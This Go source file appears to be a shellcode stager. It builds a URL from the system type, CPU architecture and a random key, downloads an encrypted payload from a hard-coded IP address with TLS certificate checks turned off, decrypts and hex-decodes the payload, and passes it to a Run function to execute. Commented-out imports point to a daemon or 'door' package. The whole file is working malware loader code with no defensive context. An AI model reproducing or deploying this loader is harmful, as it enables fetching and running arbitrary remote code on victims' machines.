package main

//import _ "github.com/icattlecoder/godaemon"
//import _ "door/deamon"

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"runtime"

	"crypto/tls"
	"net/http"
)

var (
	keys string
)

func main() {
	defer func() {
		if err := recover(); err != nil {
			fmt.Println("捕获异常:", err)
		}
	}()

	domain := "192.168.100.135"
	sysType := getSystemType()
	keys = GetKeys(32)
	uri := fmt.Sprintf("https://%s/update/%s/%s/%s", domain, sysType, runtime.GOARCH, keys)

	filecontent := getRmoteCode(uri)
	sc, _ := hex.DecodeString(string(filecontent))

	Run(sc)
	// switch sysType {
	// case "windows":
	// 	run.WindowsRun(sc)
	// case "linux":
	// 	run.LinuxRun(sc)
	// case "andorid":
	// 	run.AndroidRun(sc)
	// default:
	// 	run.WindowsRun(sc)
	// }

}

func getSystemType() string {
	switch runtime.GOOS {
	case "windows":
		return "windows"
	case "linux", "darwin", "freebsd":
		return "linux"
	case "android":
		return "android"
	default:
		return "windows"
	}
}

func getRmoteCode(uri string) []byte {
	fmt.Println(uri)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	c := &http.Client{
		Transport: tr,
	}

	resp, err := c.Get(uri)

	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		panic("response error.")

	}

	return decode(resp.Body)
}

func decode(encodeBytes io.Reader) []byte {
	var decodeBytes []byte
	decodeBuf := bytes.NewBuffer(decodeBytes)
	err := Decrypt(encodeBytes, decodeBuf, []byte(keys), []byte(keys))
	if err != nil {
		panic(err)
	}
	sc, err := ioutil.ReadAll(decodeBuf)
	if err != nil {
		panic(err)
	}
	return sc
}

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func GetKeys(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
